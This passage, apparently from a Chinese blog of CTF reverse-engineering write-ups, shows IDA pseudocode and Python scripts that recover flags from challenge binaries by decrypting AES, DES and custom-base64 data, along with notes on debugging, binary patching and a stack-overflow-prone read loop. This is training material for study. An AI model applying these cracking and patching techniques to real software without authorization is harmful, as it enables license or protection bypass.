class="keyword">unsigned</span> __int8 v35[<span class="number">128</span>]; <span class="comment">// [esp+418h] [ebp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v36; <span class="comment">// [esp+4A4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="keyword">char</span> *)a2;</span><br><span class="line">  v28 = *(_DWORD *)(a2 + <span class="number">16</span>);</span><br><span class="line">  v3 = <span class="number">16</span> * ((v28 &gt;&gt; <span class="number">4</span>) + <span class="number">1</span>);</span><br><span class="line">  v24 = v3;</span><br><span class="line">  Size = v3 + <span class="number">1</span>;</span><br><span class="line">  Block = (<span class="keyword">char</span> *)unknown_libname_1(v3 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memset</span>(Block, <span class="number">0</span>, v3 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)v2 + <span class="number">5</span>) &gt;= <span class="number">0x10</span>u )</span><br><span class="line">    v2 = *(<span class="keyword">char</span> **)v2;</span><br><span class="line">  v4 = Block;</span><br><span class="line">  v5 = Block - v2;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *v2++;</span><br><span class="line">    v2[v5 - <span class="number">1</span>] = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 );</span><br><span class="line">  v7 = v28 &amp; <span class="number">0xF</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">16</span> - v7 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">16</span> - v7;</span><br><span class="line">    v9 = <span class="number">16843009</span> * (<span class="keyword">unsigned</span> __int8)(<span class="number">16</span> - v7);</span><br><span class="line">    v10 = &amp;Block[<span class="number">16</span> * (v28 &gt;&gt; <span class="number">4</span>) + v7];</span><br><span class="line">    v4 = Block;</span><br><span class="line">    v11 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">16</span> - v7) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    memset32(v10, v9, v11);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v10[<span class="number">4</span> * v11], v9, v8 &amp; <span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4[v3] = <span class="number">0</span>;</span><br><span class="line">  v12 = (<span class="keyword">char</span> *)unknown_libname_1(Size);</span><br><span class="line">  v29 = v12;</span><br><span class="line">  <span class="built_in">memset</span>(v12, <span class="number">0</span>, Size);</span><br><span class="line">  v30 = &amp;AES::`vftable<span class="number">&#x27;</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  aes_init((<span class="keyword">int</span>)&amp;v30, v19, v20, v21, v22);      <span class="comment">// key硬编码在里面</span></span><br><span class="line">  v13 = v31;</span><br><span class="line">  <span class="keyword">if</span> ( v31 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v24 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = v33;</span><br><span class="line">      <span class="keyword">if</span> ( !(v24 % v33) )</span><br><span class="line">      &#123;</span><br><span class="line">        v15 = Block;</span><br><span class="line">        Sizea = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v24 / v33 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v16 = v35;</span><br><span class="line">            <span class="keyword">if</span> ( v13 )</span><br><span class="line">            &#123;</span><br><span class="line">              v17 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v14 &gt; <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">do</span></span><br><span class="line">                  *v16++ ^= v15[v17++];         <span class="comment">// v16为iv</span></span><br><span class="line">                <span class="keyword">while</span> ( v17 &lt; (<span class="keyword">int</span>)v33 );</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sub_4013E0((<span class="keyword">int</span>)&amp;v30, v35, v12);</span><br><span class="line">            <span class="built_in">memcpy</span>(v35, v12, v33);</span><br><span class="line">            v14 = v33;</span><br><span class="line">            v15 += v33;</span><br><span class="line">            v12 += v33;</span><br><span class="line">            <span class="keyword">if</span> ( ++Sizea &gt;= v24 / v33 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v13 = v31;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v12 = v29;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401A70(a1, v12, v24);</span><br><span class="line">  j_j_free(Block);</span><br><span class="line">  j_j_free(v12);</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">b&quot;nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=&quot;</span></span><br><span class="line">cipher = base64.b64decode(s)</span><br><span class="line">key = <span class="string">b&quot;sycloversyclover&quot;</span></span><br><span class="line">iv = <span class="string">b&quot;sctfsctfsctfsctf&quot;</span></span><br><span class="line">obj = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">plain = obj.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure><h3 id="GKCTF-2021-QQQQT"><a href="#GKCTF-2021-QQQQT" class="headerlink" title="[GKCTF 2021]QQQQT"></a>[GKCTF 2021]QQQQT</h3><p>反编译后base58 解密</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211012231300878.png"></p><h3 id="SCTF2019-Who-is-he"><a href="#SCTF2019-Who-is-he" class="headerlink" title="[SCTF2019]Who is he"></a>[SCTF2019]Who is he</h3><p>Unity逆向，主要看<code>Assembly-CSharp.dll</code>, DES解密，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void OnClick()</span><br><span class="line">	&#123;</span><br><span class="line">		Debug.Log(&quot;Button Clicked. TestClick.&quot;);</span><br><span class="line">		Debug.Log(this.Name.text);</span><br><span class="line">		bool flag = this.Name.text.Equals(this.Decrypt(this.EncryptData));</span><br><span class="line">		if (flag)</span><br><span class="line">		&#123;</span><br><span class="line">			Debug.Log(&quot;Right&quot;);</span><br><span class="line">			TestClick.Messagebox.MessageBox(IntPtr.Zero, &quot;Haha, same as you!&quot;, &quot;Info:&quot;, 0);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			Debug.Log(&quot;Wrong&quot;);</span><br><span class="line">			TestClick.Messagebox.MessageBox(IntPtr.Zero, &quot;Emmmmm,I don&#x27;t think so.&quot;, &quot;Info:&quot;, 0);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">private string Decrypt(string str)</span><br><span class="line">	&#123;</span><br><span class="line">		string result;</span><br><span class="line">		try</span><br><span class="line">		&#123;</span><br><span class="line">			byte[] bytes = Encoding.Unicode.GetBytes(TestClick.encryptKey);</span><br><span class="line">			byte[] array = Convert.FromBase64String(str);</span><br><span class="line">			DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider();</span><br><span class="line">			MemoryStream memoryStream = new MemoryStream();</span><br><span class="line">			CryptoStream cryptoStream = new CryptoStream(memoryStream, descryptoServiceProvider.CreateDecryptor(bytes, bytes), CryptoStreamMode.Write);</span><br><span class="line">			cryptoStream.Write(array, 0, array.Length);</span><br><span class="line">			cryptoStream.FlushFinalBlock();</span><br><span class="line">			byte[] bytes2 = memoryStream.ToArray();</span><br><span class="line">			cryptoStream.Close();</span><br><span class="line">			memoryStream.Close();</span><br><span class="line">			result = Encoding.Unicode.GetString(bytes2);</span><br><span class="line">		&#125;</span><br><span class="line">		catch</span><br><span class="line">		&#123;</span><br><span class="line">			result = str;</span><br><span class="line">		&#125;</span><br><span class="line">		return result;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure><p>由于<code>Encoding.GetEncoding(&quot;utf-8&quot;).GetBytes</code>故密钥每个字符后面要补上<code>\x00</code>, 解得假flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = <span class="string">b&quot;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&quot;</span></span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">key = <span class="string">b&quot;1\x002\x003\x004\x00&quot;</span></span><br><span class="line">iv = key</span><br><span class="line">des = DES.new(key, DES.MODE_CBC, iv)</span><br><span class="line">plain = des.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(plain.decode(<span class="string">&#x27;UTF-16&#x27;</span>))</span><br></pre></td></tr></table></figure><p>动态调试程序，根据传参规则，在栈中找到两个参数</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211015162152572.png" alt="image-20211015162152572"></p><p>在返回值处下断，不断调试跟踪，找到</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211015162253459.png" alt="image-20211015162253459"></p><p>此处有个跳转，该跳转就是跳到错误提示的地方，如果不调转则会输出正确输出，则断在<code>call r11</code>，进去后根据传参规则，查看<code>rdi</code>就是我们的输入，<code>rsi</code>则是对比的flag</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211015163141171.png" alt="image-20211015163141171"></p><p>得到flag</p><h3 id="FlareOn2-very-success"><a href="#FlareOn2-very-success" class="headerlink" title="[FlareOn2]very_success"></a>[FlareOn2]very_success</h3><p>ida32打开, 根据字符串搜索找到主要函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line">BOOL __usercall sub_401000@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp-14h] [ebp-14h]</span></span><br><span class="line">  HANDLE StdHandle; <span class="comment">// [esp-10h] [ebp-10h]</span></span><br><span class="line">  HANDLE v5; <span class="comment">// [esp-Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp-8h] [ebp-8h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp-4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = v7;</span><br><span class="line">  v7 = a1;</span><br><span class="line">  v3 = v1;</span><br><span class="line">  StdHandle = GetStdHandle(<span class="number">0xFFFFFFF6</span>);</span><br><span class="line">  v5 = GetStdHandle(<span class="number">0xFFFFFFF5</span>);</span><br><span class="line">  WriteFile(v5, aYouCrushedThat, <span class="number">0x43</span>u, (LPDWORD)&amp;v6, <span class="number">0</span>);</span><br><span class="line">  ReadFile(StdHandle, flag, <span class="number">0x32</span>u, (LPDWORD)&amp;v6, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( sub_401084((<span class="keyword">int</span>)&amp;v6, v3, flag, v6) )</span><br><span class="line">    <span class="keyword">return</span> WriteFile(v5, aYouAreSuccess, <span class="number">0x11</span>u, (LPDWORD)&amp;v6, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> WriteFile(v5, aYouAreFailure, <span class="number">0x11</span>u, (LPDWORD)&amp;v6, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中sub_401084函数为check函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="keyword">int</span> __usercall sub_401084@&lt;eax&gt;(<span class="keyword">int</span> result@&lt;eax&gt;, <span class="keyword">int</span> a2, <span class="keyword">char</span> *a3, <span class="keyword">int</span> a4)</span><br><span class="line">&#123;</span><br><span class="line">  __int16 v4; <span class="comment">// bx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// cf</span></span><br><span class="line">  __int16 v12; <span class="comment">// ax</span></span><br><span class="line">  <span class="keyword">bool</span> v13; <span class="comment">// zf</span></span><br><span class="line">  _BYTE *v14; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">37</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a4 &gt;= <span class="number">37</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (_BYTE *)(a2 + <span class="number">36</span>);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LOWORD(result) = <span class="number">0x1C7</span>;</span><br><span class="line">      v15 = result;</span><br><span class="line">      v8 = *a3++;</span><br><span class="line">      v9 = __readeflags();</span><br><span class="line">      v10 = v15 ^ v8;</span><br><span class="line">      __writeeflags(v9);</span><br><span class="line">      v12 = (<span class="keyword">unsigned</span> __int8)(__ROL1__(<span class="number">1</span>, v4 &amp; <span class="number">3</span>) + v11 + v10);</span><br><span class="line">      v4 += v12;</span><br><span class="line">      v13 = *v7 == (<span class="keyword">unsigned</span> __int8)v12;</span><br><span class="line">      v14 = v7 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v13 )</span><br><span class="line">        LOWORD(v5) = <span class="number">0</span>;</span><br><span class="line">      result = v15;</span><br><span class="line">      <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v7 = v14 - <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !--v5 )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则可知flag长度大于等于37， v7为对比的数据，从后往前check，动调，发现为<code>start</code>往下</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211015173545176.png" alt="image-20211015173545176"></p><p>对输入的数据加密如下，只不过反编译出来有些奇怪。其中<code>sum</code>从0开始，每次加上计算后的数，即本次对比的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(input ^ 0xC7) + (1 &lt;&lt; (sum &amp; 3)) + 1 </span><br></pre></td></tr></table></figure><p>则解密脚本为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = [<span class="number">0xAF</span>, <span class="number">0xAA</span>, <span class="number">0xAD</span>, <span class="number">0xEB</span>, <span class="number">0xAE</span>, <span class="number">0xAA</span>, <span class="number">0xEC</span>, <span class="number">0xA4</span>, <span class="number">0xBA</span>, <span class="number">0xAF</span>, <span class="number">0xAE</span>, <span class="number">0xAA</span>, <span class="number">0x8A</span>, <span class="number">0xC0</span>, <span class="number">0xA7</span>, <span class="number">0xB0</span>, <span class="number">0xBC</span>, <span class="number">0x9A</span>, <span class="number">0xBA</span>, <span class="number">0xA5</span>, <span class="number">0xA5</span>, <span class="number">0xBA</span>, <span class="number">0xAF</span>, <span class="number">0xB8</span>, <span class="number">0x9D</span>, <span class="number">0xB8</span>, <span class="number">0xF9</span>, <span class="number">0xAE</span>, <span class="number">0x9D</span>, <span class="number">0xAB</span>, <span class="number">0xB4</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xB3</span>, <span class="number">0x90</span>, <span class="number">0x9A</span>, <span class="number">0xA8</span>][::-<span class="number">1</span>]</span><br><span class="line">x = <span class="number">0xC7</span></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL1</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; x</span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    flag += <span class="built_in">bytes</span>([(i - ROL1(<span class="built_in">sum</span> &amp; <span class="number">3</span>) - <span class="number">1</span>) ^ x])</span><br><span class="line">    <span class="built_in">sum</span> += i</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="CISCN2018-2ex"><a href="#CISCN2018-2ex" class="headerlink" title="[CISCN2018]2ex"></a>[CISCN2018]2ex</h3><p>MIPS32, IDA打开，找到主要函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400788</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">20</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">28</span>]; <span class="comment">// [sp+2Ch] [+2Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_400840(v1);                               <span class="comment">// read v1</span></span><br><span class="line">  sub_4010F0((<span class="keyword">int</span>)v2, <span class="number">25</span>);</span><br><span class="line">  sub_400430(v1, <span class="number">17u</span>, v2);                      <span class="comment">// change_table_base64, v1 =&gt; in, v2 =&gt; out</span></span><br><span class="line">  sub_4009C0((<span class="keyword">int</span>)v2);                          <span class="comment">// print(v2)</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>导出新表，解得<code>flag</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">new_table = <span class="built_in">bytes</span>([<span class="number">0x40</span>, <span class="number">0x2C</span>, <span class="number">0x2E</span>, <span class="number">0x31</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x23</span>, <span class="number">0x60</span>, <span class="number">0x2F</span>, <span class="number">0x32</span>, <span class="number">0x65</span>, <span class="number">0x68</span>, <span class="number">0x75</span>, <span class="number">0x78</span>, <span class="number">0x24</span>, <span class="number">0x7E</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x64</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x79</span>, <span class="number">0x25</span>, <span class="number">0x5F</span>, <span class="number">0x3B</span>, <span class="number">0x34</span>, <span class="number">0x63</span>, <span class="number">0x6A</span>, <span class="number">0x73</span>, <span class="number">0x7A</span>, <span class="number">0x5E</span>, <span class="number">0x2B</span>, <span class="number">0x7B</span>, <span class="number">0x35</span>, <span class="number">0x62</span>, <span class="number">0x6B</span>, <span class="number">0x72</span>, <span class="number">0x41</span>, <span class="number">0x26</span>, <span class="number">0x3D</span>, <span class="number">0x7D</span>, <span class="number">0x36</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x71</span>, <span class="number">0x42</span>, <span class="number">0x2A</span>, <span class="number">0x2D</span>, <span class="number">0x5B</span>, <span class="number">0x37</span>, <span class="number">0x30</span>, <span class="number">0x6D</span>, <span class="number">0x70</span>, <span class="number">0x43</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x5D</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x44</span>])</span><br><span class="line">old_table = <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(new_table), <span class="built_in">len</span>(old_table))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    d = file.read()</span><br><span class="line">    d = d.translate(<span class="built_in">bytes</span>.maketrans(new_table, old_table))</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    <span class="built_in">print</span>(base64.b64decode(d))</span><br></pre></td></tr></table></figure><h3 id="watevrCTF-2019-Timeout"><a href="#watevrCTF-2019-Timeout" class="headerlink" title="[watevrCTF 2019]Timeout"></a>[watevrCTF 2019]Timeout</h3><p>ida打开，本题有两种做法</p><h4 id="No-1"><a href="#No-1" class="headerlink" title="No.1"></a>No.1</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  signal(<span class="number">14</span>, (<span class="keyword">__sighandler_t</span>)sig);</span><br><span class="line">  alarm(<span class="number">1u</span>);</span><br><span class="line">  delay(<span class="number">6000000LL</span>);</span><br><span class="line">  can_continue = <span class="number">1337</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数，根据<code>can_continue</code>查引用，找到<code>generate</code>函数，直接得到flag</p><h4 id="No-2"><a href="#No-2" class="headerlink" title="No.2"></a>No.2</h4><p>patch<code>generate</code>函数判断条件，然后再main函数开头直接跳到<code>generate</code>函数</p><h3 id="网鼎杯-2020-青龙组-bang"><a href="#网鼎杯-2020-青龙组-bang" class="headerlink" title="[网鼎杯 2020 青龙组]bang"></a>[网鼎杯 2020 青龙组]bang</h3><p><a href="https://lantern.cool/wp-games-2020wd/">2020 网鼎杯 | Lantern’s 小站</a></p><h3 id="Dig-the-way"><a href="#Dig-the-way" class="headerlink" title="Dig the way"></a>Dig the way</h3><p>主函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">20</span>]; <span class="comment">// [esp+1Ch] [ebp-48h] BYREF</span></span><br><span class="line">  _DWORD v7[<span class="number">3</span>]; <span class="comment">// [esp+30h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+3Ch] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+40h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+44h] [ebp-20h]</span></span><br><span class="line">  _DWORD v11[<span class="number">3</span>]; <span class="comment">// [esp+48h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [esp+54h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+58h] [ebp-Ch]</span></span><br><span class="line">  FILE *v14; <span class="comment">// [esp+5Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v11[<span class="number">0</span>] = func0;</span><br><span class="line">  v11[<span class="number">1</span>] = func1;</span><br><span class="line">  v11[<span class="number">2</span>] = func2;</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v7[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">  v7[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">  v8 = <span class="number">3</span>;</span><br><span class="line">  v9 = <span class="number">3</span>;</span><br><span class="line">  v10 = <span class="number">4</span>;</span><br><span class="line">  v14 = fopen(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v14 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  fseek(v14, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">  v13 = ftell(v14);</span><br><span class="line">  fseek(v14, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  v12 = ftell(v14);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;something wrong&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v13; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = i;</span><br><span class="line">      Str[v4] = fgetc(v14);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) &lt;= v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = v8;</span><br><span class="line">      i = <span class="number">0</span>;</span><br><span class="line">      v12 = v10;</span><br><span class="line">      <span class="keyword">while</span> ( i &lt;= <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = i + <span class="number">1</span>;</span><br><span class="line">        v7[v5] = ((<span class="keyword">int</span> (__cdecl *)(_DWORD *, <span class="keyword">int</span>, <span class="keyword">int</span>))v11[i])(v7, v9, v10);</span><br><span class="line">        v9 = ++i;</span><br><span class="line">        v10 = i + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        get_key(v13, v12);</span><br><span class="line">        system(<span class="string">&quot;PAUSE&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从data中读入数据，其中下述代码用于获得文件读入数据的长度</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fseek(v14, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line"> v13 = ftell(v14);</span><br><span class="line"> fseek(v14, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"> v12 = ftell(v14);</span><br></pre></td></tr></table></figure><p>而这串读入代码有栈溢出的风险，即越界写</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for ( i = 0; i &lt; v12; ++i )</span><br><span class="line">   &#123;</span><br><span class="line">     v4 = i;</span><br><span class="line">     Str[v4] = fgetc(v13);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>接下来研究3个函数</p><h4 id="fun0"><a href="#fun0" class="headerlink" title="fun0"></a>fun0</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">func0</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span 